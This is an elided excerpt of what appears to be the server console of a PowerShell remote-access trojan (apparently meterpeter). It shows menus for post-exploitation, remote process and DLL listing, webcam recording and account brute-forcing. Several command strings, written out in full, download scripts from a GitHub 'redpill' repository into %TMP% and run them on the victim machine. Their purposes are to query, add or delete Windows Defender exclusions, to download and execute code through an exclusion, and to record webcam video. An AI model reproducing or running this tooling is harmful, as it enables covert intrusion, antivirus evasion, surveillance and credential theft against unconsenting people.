...
#   PS cmdlet Dev version: v1.10.2
#   PS cmdlet sub version: v1.10.12.2
  ...
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "Pranks")
    {
      ...
      If($choise -ieq "Nodrives")
      {
        ...
        write-host "Client:Admin - Privileges Required" -ForegroundColor DarkYellow;
    ...
    If($Command -ieq "NetScanner")
    {
      ...
      If($choise -ieq "GeoLocate" -or $choise -ieq "GEO")
      {
         ...
         write-host "   ifconfig  Client GeoLocation using ipinfo Client:User - Privileges Required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
    ...
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ...
      If($choise -ieq "Processes" -or $choise -ieq "proc")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow;
         write-host "   -------";
         write-host "   Module to manage remote processes";
         write-host "`n`n   Modules    Description                        Remark" -ForegroundColor green;
         write-host "   -------    -----------                        ------";
         write-host "   Check      List Remote Processe(s) Running    Client:User  - Privileges Required";
         write-host "   Query      Process name verbose information   Client:User  - Privileges Required";
         write-host "   DllSearch  List DLLs loaded by processes      Client:User  - Privileges Required";
         ...
         If($wifi_choise -ieq "Query")
         {
            ...
            Else
            {
               write-host " * '$Proc_name' verbose information." -ForegroundColor Green;Start-Sleep -Seconds 1;
         ...
         {
               write-host " * List DLLs loaded by running processes." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      If($choise -ieq "Exclusions")
      {
        ...
        write-host "   Remark: Administrator privileges required to manipulate WD exclusions." -ForegroundColor Yellow
        write-host "   Remark: URI will be upload to %TMP% and not deleted after execution." -ForegroundColor Yellow
        write-host "`n`n   Modules     Description                      Remark" -ForegroundColor green;
        write-host "   -------     -----------                      -------";
        write-host "   Query       Query all Defender exclusions    Client:Admin  - Privileges Required";
        write-host "   Create      Create a new Defender exclusion  Client:Admin  - Privileges Required";
        write-host "   UrlExec     Download\Exec through exclusion  Client:Admin  - Privileges Required";
        write-host "   Delete      Delete one Defender exclusion    Client:Admin  - Privileges Required";
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        ...
        If($WD_choise -ieq "Query")
        {
           ...
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'query';Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force"
        }
        If($WD_choise -ieq "Create")
        {
           ...
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'add' -Type `"$ExcludeType`" -Exclude `"$ExcludePath`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force"
        }
        ...
        If($WD_choise -ieq "Delete")
        {
           ...
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'del' -Type `"$ExcludeType`" -Exclude `"$ExcludePath`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force"
        }
...
"@;Write-Host $AnwsomeBanner
      ...
      If($choise -ieq "Camera" -or $choise -ieq "cam")
      {
        ...
        write-host "   WebCamAvi  Live stream using WebCam    Client:User  - Privileges required";
        write-host "   Return     Return to Server Main Menu" -ForeGroundColor yellow;
        ...
        If($Cam_choise -ieq "WebCamAvi")
        {
           ...
           If(-not($RecTime))
           {
              write-host "   => Defaulting RecordTime to 10 (sec)" -ForeGroundColor DarkYellow;
              [int]$RecTime = "10"
           }
           If($RecTime -lt 8 -or $RecTime -gt 60)
           {
              write-host "   => Defaulting RecordTime to 10 (sec)" -ForeGroundColor DarkYellow;
              [int]$RecTime = "10"           
           }

           write-host "`n`n  State      VideoFile       RecordTime" -ForegroundColor Yellow
           write-host "  -----      ---------       ----------"
           write-host "  recording  meterpeter.avi  ${RecTime} (sec)`n`n"

           #Execute command remote
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1`" -OutFile `"`$Env:TMP\Invoke-webcamAvi.ps1`";powershell -File `"`$Env:TMP\Invoke-webcamAvi.ps1`" -RecTime `"$RecTime`";Remove-Item -Path `"`$Env:TMP\Invoke-webcamAvi.ps1`" -Force";
        }
      ...
      If($choise -ieq "BruteAcc")
      {
         ...
         write-host "`n`n   Modules  Description                  Remark" -ForegroundColor green;
         write-host "   -------  -----------                  ------";
         write-host "   Start    Bruteforcing user account    Client:User  - Privileges Required";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         ...
         If($Brute_choise -ieq "Start")
         {
            ...
            #Adding values to output DataTable!
            $BruteTable.Rows.Add("$UserAccountName","$BruteTime","`$Env:TMP\passw.txt")|Out-Null
